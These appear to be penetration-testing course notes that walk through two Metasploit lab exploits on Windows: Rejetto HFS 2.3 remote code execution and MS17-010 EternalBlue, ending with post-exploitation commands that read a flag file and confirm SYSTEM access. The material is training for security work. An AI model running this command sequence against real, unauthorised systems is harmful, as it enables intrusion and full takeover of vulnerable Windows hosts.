# Exploiting Windows

## Exploiting a Vulnerable HTTP File Server (HFS)

### Overview

- **HTTP File Server (HFS)**: A web server designed for file and document sharing.
- **Communication**: Typically runs on **TCP port 80** and uses the **HTTP protocol**.
- **Rejetto HFS**: A free, open-source HTTP file server for both **Windows** and **Linux**.
- **Vulnerability**: Version 2.3 of Rejetto HFS is vulnerable to **Remote Code Execution (RCE)**.
- **Exploit Module**: Metasploit (MSF) provides an exploit module to target this vulnerability and gain access to the system running HFS.

### Demo: Exploiting a Vulnerable HTTP File Server

Start the Metasploit service and PostgreSQL database:

```bash
service postgresql start && msfconsole
```

Verify the database connection:

```bash
db_status
```

Create a new workspace for organizing the attack:

```bash
workspace -a HFS
```

Set the target IP address globally:

```bash
setg rhosts [targetIP]
```

We perform an Nmap scan, identifying open ports, services, and the operating system. The scan results are stored directly in the Metasploit database:

```bash
db_nmap -sS -sV -O [targetIP]
```

We search for the **Rejetto HFS** exploit module in Metasploit:

```bash
search type:exploit name:rejetto
```

We use the exploit module for the Rejetto HFS vulnerability:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Display the options available for this exploit to ensure proper configuration:

```bash
show options
```

Retrieve detailed information about the exploit module:

```bash
info
```

Run the exploit to execute the attack and gain access to the target system:

```bash
run
```

### Post-Exploitation: Meterpreter Session

After a successful exploit, interact with the target system through a Meterpreter session.

Open a shell on the compromised system:

```bash
shell
```

Navigate to the root directory:

```bash
cd /
```

List the contents of the current directory:

```bash
dir
```

Read the content of the flag file:

```bash
type flag.txt
```

### Conclusion

Using Metasploit, we successfully exploited the vulnerable HTTP File Server running on the target system by leveraging the **Rejetto HFS Remote Code Execution exploit**.

# Exploiting Windows MS17-010 SMB Vulnerability

## MS17-010 EternalBlue Exploit

### Overview

- **EternalBlue (MS17-010/CVE-2017-0144)**: A collection of Windows vulnerabilities that allow attackers to remotely execute arbitrary code and gain access to a Windows system and potentially the entire network.
- **Vulnerability**: Exploits a flaw in the **Windows SMBv1 protocol**, allowing specially crafted packets to execute arbitrary commands on the target system.
- **Affected Windows Versions**:
  - Windows Vista, 7, Server 2008, 8.1, Server 2012, 10, Server 2016
- **EternalBlue in Metasploit**:
  - **Auxiliary Module**: Scans systems to check if they are vulnerable to the MS17-010 exploit.
  - **Exploit Module**: Exploits the vulnerability on unpatched systems, providing a privileged Meterpreter session on the target.

## Demo: Exploiting Windows MS17-010 SMB Vulnerability

Start the Metasploit console:

```bash
msfconsole
```

Create a new workspace for the EternalBlue attack:

```bash
workspace -a EternalBlue
```

Perform an Nmap scan to identify open ports and services:

```bash
db_nmap -sS -sV -O [targetIP]
```

### Step 1: Check if Target is Vulnerable

Search for the **EternalBlue auxiliary scanner** in Metasploit:

```bash
search type:auxiliary name:eternalblue
```

Use the auxiliary module to check if the target is vulnerable:

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

Show available options for the module:

```bash
show options
```

Set the target IP address:

```bash
set rhosts [targetIP]
```

Run the scanner to check for vulnerability:

```bash
run
```

If the target is vulnerable, the scan will confirm this.

### Step 2: Exploiting the Vulnerability

Search for the **EternalBlue exploit** in Metasploit:

```bash
search type:exploit name:eternalblue
```

Use the exploit module:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Show the available options for the exploit:

```bash
show options
```

Set the target IP:

```bash
set rhosts [targetIP]
```

Run the exploit to gain access:

```bash
run
```

### Post-Exploitation: Meterpreter Session

Once the exploit is successful, you will have a **Meterpreter session**. You can now interact with the target system.

Get system information:

```bash
sysinfo
```

Check the user privileges:

```bash
getuid
```

If successful, you will have access to the system as **NT AUTHORITY/SYSTEM**.

### Conclusion

Using the **EternalBlue exploit** in Metasploit, we successfully exploited the **MS17-010 SMB vulnerability** on the target system, gaining privileged access via a Meterpreter session.



 

